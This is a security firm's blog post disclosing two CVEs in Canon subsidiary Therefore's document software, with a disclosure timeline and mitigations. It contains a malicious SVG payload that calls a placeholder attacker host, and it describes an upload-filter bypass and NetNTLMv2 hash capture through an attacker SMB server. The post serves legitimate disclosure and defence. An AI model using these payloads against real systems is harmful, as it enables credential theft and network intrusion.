---
title: "How to Hack a 20 billion euro multinational corporation (legally)?"
description: "Canon, a 20 billion euro multinational corporation, is impacted by 2 critical vulnerabilities that, under certain conditions, can compromise the infrastructure hosting the vulnerable application. Trackflaw shares its discovery and responsible disclosure process."
date: 2024-02-02T06:13:21+01:00
draft: false
images: [/images/hacker-multinationale-via-file-upload-et-ssrf/logo.png]
featuredImage: "/images/hacker-multinationale-via-file-upload-et-ssrf/logo.png"
featuredImagePreview: "/images/hacker-multinationale-via-file-upload-et-ssrf/logo.png"
tags: ["Penetration Testing", "Pentest", "CVE"]
---

# 📸 CVE-2023-2520{2|3}: How to hack MULTINATIONAL company with file upload and SSRF?

## Introduction

Information security is now at the **heart of our daily lives**. On the news, on the internet, on social networks, everyone, with or without knowledge, seems to **have already been a victim** of a more or less serious computer attack.

And this can affect small businesses as well as the biggest companies in the **CAC40**. If you thought the security of the world's biggest companies was inviolable, think again.

Some examples of the worst data breaches:

- **Yahoo August 2013**: personal information estimated at up to **3 billion users**.
- **LinkedIn May 2016**: email/password of more than **150 million users**.
- **Facebook April 2021**: first name, last name, email, phone, employers of more than **500 million users**.

Today, through this article, we'll look back at a hack worth **20 billion euros** (at least! 😅).

## Context

### Responsible disclosure process

This article was produced in agreement with ANSSI, [the National Agency for Information Systems Security](https://cyber.gouv.fr/) following a **responsible disclosure process**.

{{< admonition type=bug title="Be Responsible" open=true >}}
When discovering a vulnerability, it is preferable to directly contact the developer/responsible party for the solution. **Do not disclose vulnerabilities without authorization.**
{{< /admonition >}}

### The target

**Canon Inc** is a Japanese company based in Tokyo, specializing in optical products, including cameras, photocopiers, and printers.

It generates a revenue of around **25 billion dollars** annually.

![Alt text](/images/hacker-multinationale-via-file-upload-et-ssrf/canon.png)

## A "routine" penetration test

### Flashback to 2022

In **December 2022**, Trackflaw was commissioned to perform a technical audit of the web/application penetration test type for a major account client (the name is censored for confidentiality reasons).

The application audit, lasting **5 days**, was to be conducted in a grey box manner and concerned a document management application. This type of audit is quite standard and is regularly performed by Trackflaw.

The audited software was from **Therefore**, a subsidiary of **Canon**. The study of this software revealed **2 critical vulnerabilities**.

### Client or not?

**Therefore** is a company offering **information management** solutions. One of the main software products of Therefore specializes in document processing. All solutions are available directly on their website.

{{< admonition type=question title="How to Communicate?" open=true >}}
🤔 So, the discovered vulnerabilities concern **Therefore** and not the initial client. How to communicate the weaknesses?
{{< /admonition >}}

💡 Indeed, the question is important!

During the penetration test, several significant vulnerabilities in Therefore's document processing solution were identified.

The penetration test was conducted on **the `Capture` document management application**. The vulnerabilities concern both the web version and the heavy client version.

Normally, it's the client's responsibility to handle the process:

1. The auditor (Trackflaw) sends the report to the initial client.
2. The initial client analyzes and sends the report to the developer (Therefore).
3. The developer (Therefore) fixes the vulnerabilities.

<video src="/images/hacker-multinationale-via-file-upload-et-ssrf/report.mp4" controls autoplay loop title="Report Communication" style="width:100%"></video>


However, here, communication was not... optimal. The process had to evolve.

1. An initial report concerning all the vulnerabilities from the audit was communicated to the initial client.
2. A second anonymized report was written containing only the vulnerabilities impacting Therefore (and not the initial client!).
3. This anonymized report was then to be forwarded to **Therefore**.


😅 Except that everything did not go as planned again!


### CVE - Common Vulnerabilities and Exposures

An IT solution can be used by several actors, or rather, users.

When a weakness is discovered, the researcher must **communicate with the solution's developer** when there is no intermediary client (unlike us here) in order to **fix the problems across all its deployed applications**.

To do this, the researcher will write a small report to explain the discovered problems. This is called an `advisory`.

To facilitate the traceability of vulnerabilities discovered in "public" products, the MITRE organization, supported by the United States Department of Homeland Security, created **the CVE information database**.

{{< admonition type=quote title="Common Vulnerabilities and Exposures" open=true >}}
`Common Vulnerabilities and Exposures` or `CVE` is a public information dictionary related to security vulnerabilities. The database is maintained by the `MITRE` organization, supported by the United States Department of Homeland Security.
{{< /admonition >}}

<video src="/images/hacker-multinationale-via-file-upload-et-ssrf/mitre.mp4" controls autoplay loop title="MITRE Database" style="width:100%"></video>

In parallel with writing the advisory, **2 declarations** were made concerning the two discovered weaknesses. No technical information is available at this stage. Only the identifiers of the vulnerabilities are available.

In our case, 2 numbers:

- **CVE-2023-25202**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25202
- **CVE-2023-25203**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25203

The CVE-2023-25202 and CVE-2023-25203 are affected `Therefore Case Manager 2018/2021` and `Therefore Solution Designer 2018/2021` (https://www.therefore.net/help/2021/en-us/rn_releasenotes.html). 

All the versions equal or lower at `18.4.0` and equal or lower at `26.1.1`  are vulnerable to both vulnerabilities. To this day, I still have no news about Therefore and if the new version is correctly patched.

### Communication with ANSSI

![Alt text](/images/hacker-multinationale-via-file-upload-et-ssrf/anssi.png)

**ANSSI** or **the French National Agency for the Security of Information Systems** is a French service created by decree in July 2009. This national competency service is attached to the Secretariat-General for National Defence and Security (SGDSN), the authority responsible for assisting the Prime Minister in exercising his responsibilities in terms of defense and national security.

This French organization played a major role in initiating dialogue with **Therefore**.

### Responsible Disclosure

After making contact, ANSSI managed to establish a connection with Therefore via the **Austrian CERT**. This exchange process spanned almost **one year** and unlocked the situation.

After many unreturned messages, ANSSI, in agreement with the Austrian CERT, authorized the disclosure of the vulnerabilities on **December 12, 2023**. 🥳

### Final Timeline


| **Date**         | **Action**                                                                                      |
| ---------------- | ----------------------------------------------------------------------------------------------- |
| November 28, 2022 | Discovery of vulnerabilities during the penetration test                                        |
| December 4, 2022  | Communication of vulnerabilities to the initial client                                          |
| December 19, 2022 | Writing an advisory for Therefore                                                               |
| January 16, 2023  | Various unsuccessful contacts with Therefore                                                    |
| February 28, 2023  | Third and final contact attempt with Therefore                                                  |
| May 2, 2023       | Contact with ANSSI                                                                              |
| May 9, 2023       | Contact with Therefore via the Austrian CERT                                                    |
| September 7, 2023 | ANSSI follows up with the Austrian CERT                                                         |
| December 12, 2023 | Coordinated responsible disclosure with ANSSI and the Austrian CERT (without Therefore's agreement) |



## The Vulnerabilities

### CVE-2023-25202: Insecure file upload mechanism

![CVE-2023-25202](/images/hacker-multinationale-via-file-upload-et-ssrf/CVE-2023-25202.png)


{{< admonition type=warning title="Context" open=true >}}
The penetration test was conducted in a specific client context without Therefore's support.

The vulnerabilities in this article may only be **applicable in a specific context**.
{{< /admonition >}}

#### Description

The Therefore application is **too permissive** regarding the type of file that can be uploaded by a user.

Indeed, it only prevents the uploading of `HTML`, `EXE`, and `BAK` files. An attacker can upload technical files such as `PHP`, `ASP`, `ASPX`, and `JSP` files.

These files could allow, under certain conditions, **the execution of system commands** (not exploitable here).

The image below summarizes the different extensions that can be used in the application (generated with the `intruder` function of Burp Suite Pro).

![Too many file extensions](/images/hacker-multinationale-via-file-upload-et-ssrf/screens/file-upload-1.png)

#### Exploitation

The application prevents `HTML` files from being uploaded. This protection can be easily bypassed by uploading `markdown (MD)` files that support HTML.

It's important to note that it is **not possible to upload executable files** such as malware.

![Upload of Markdown file containing iframe](/images/hacker-multinationale-via-file-upload-et-ssrf/screens/file-upload-2.png)

This lack of control over the uploaded content facilitates the exploitation of the following vulnerability.

#### Risks

An attacker is able to upload files not controlled by the application. This allows an attacker to more easily exploit SSRF vulnerabilities, upload malicious files (other than `exe` type), or trigger denial-of-service attacks.

An attacker could also, under certain conditions, execute code through the uploaded files (ASP, PHP, JSP files, etc).

#### Mitigation

It is advised to limit the type of files to upload **to the strictly necessary**.

A standard user most of the time needs only text processing files (e.g., office and PDF files) and images. It is recommended to limit the number of usable extensions (refer to the extensions managed by the Aspose plugin developer).

### CVE-2023-25203: Application Vulnerable to SSRF (Server Side Request Forgery) Attacks

![CVE-2023-25203](/images/hacker-multinationale-via-file-upload-et-ssrf/CVE-2023-25203.png)

#### Description

The **Therefore** solution uses the `Aspose` software to manage the conversion of uploaded files to PDF format (see screenshot below).

![Version disclosure in PDF metadata.](/images/hacker-multinationale-via-file-upload-et-ssrf/screens/ssrf-1.png)

Using this type of solution allows the conversion of a large number of different files (more info in Aspose's documentation).

This presents a risk if the application does not properly manage the filtering of unused extensions.

According to the software developer **Aspose**, security measures should be in place to prevent an attacker from making the server execute internal requests. This attack is called **SSRF (Server Side Request Forgery)**.

The solution provided by Therefore is vulnerable to SSRF attacks in several ways.

#### Exploitation

##### Access to a Remote Resource

The use of an SVG file illustrates the possibility of making an `HTTP GET` request by the application to a server controlled by the attacker.

![HTTP callback from remote victim application with a malicious SVG file.](/images/hacker-multinationale-via-file-upload-et-ssrf/screens/ssrf-2.png)

The screenshot above illustrates this SSRF vulnerability using an SVG file (available below).

```html
<svg width="500" height="500"
    xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="http://ATTACKER-IP">
</svg>
```

##### Password hash retrieval

In a Windows environment, it is possible to request a resource through a specific path. This functionality can be coupled with this `SSRF` weakness to **redirect the local account of the machine hosting the application to the attacker's SMB server**.

The latter will receive the `NetNTLMv2` hash of this service account.

In the screenshot below, an `SMB` server was deployed on the attacker's machine. By interpreting the SVG file, the attacker's server collects the digest of the machine account `FR********4$`.

![Receiving NetNTLMv2 local machine account digest from the remote server.](/images/hacker-multinationale-via-file-upload-et-ssrf/screens/ssrf-3.png)

This digest could then be relayed and/or cracked to **attack the initial client's Active Directory environment**.

##### Internal network mapping

This SSRF vulnerability also allows an attacker to map the internal architecture of the client (if it communicates with the Internet).

In the screenshot below, it is possible to reach the server `google.fr`. The attacker could also use the victim machine as a proxy to **impersonate its public IP address**.

![Iframe google.fr](/images/hacker-multinationale-via-file-upload-et-ssrf/screens/ssrf-4.png)

Finally, an attacker is also able to perform the following actions (not conclusive due to lack of time):

- **Port Scanning**: it is possible to scan the ports of machines on the network.
- **File Reading**: the Aspose plugin seems to be protected against file reading (e.g., the screenshot below. The service redirects to loading the file `C:\Windows\win.ini` but nothing is displayed).
- **Denial of Service**: an attacker is able to upload a document referring to very large images. When processing this image, the library consumes memory and time to process these images.

![No file disclosure with server redirection](/images/hacker-multinationale-via-file-upload-et-ssrf/screens/ssrf-5.png)

#### Risks

The main risks of this vulnerability for clients using this solution are:

- **Credential Theft**: an attacker is able to collect the `NetNTLMv2` digest of a person uploading remote content. This type of challenge can be cracked by the attacker to retrieve the target user's password.
- **Disclosure of Sensitive Images**: processing a document containing a reference to a local image file will result in the disclosure of this file in the final document. This can lead to the disclosure of sensitive information.
- **Mapping the Victim's Information System**: an attacker can map the victim's infrastructure and perform service discovery.
- **Denial of Service**: an attacker can prevent the machine from functioning properly by rendering it unusable.

#### Mitigation

To mitigate this SSRF vulnerability, it is possible to modify the configuration of the `Aspose` plugin used in the file analysis function. The plugin is able to prevent SSRF attacks.

**Aspose** has already published an article warning about the various risks associated with loading remote elements.

The following code example shows how to disable the loading of external images:

```c#
public class DisableExternalImagesHandler : IResourceLoadingCallback
{
    public ResourceLoadingAction ResourceLoading(ResourceLoadingArgs args)
    {
        // Skip external images loading.
        return (args.ResourceType == ResourceType.Image)
        ? ResourceLoadingAction.Skip
        : ResourceLoadingAction.Default;
    }
}
...
const string documentFilename = "input.docx";
var disableExternalImagesOptions = new LoadOptions
{
    ResourceLoadingCallback = new DisableExternalImagesHandler()
};
var doc = new Document(documentFilename, disableExternalImagesOptions);
```

## Going further !

Whew! A lot of information! 😅

👇 A video is available on Trackflaw's channel for better simplification. Feel free to leave your feedback in the comments 🙏

{{< youtube TnIGum11HnY >}}
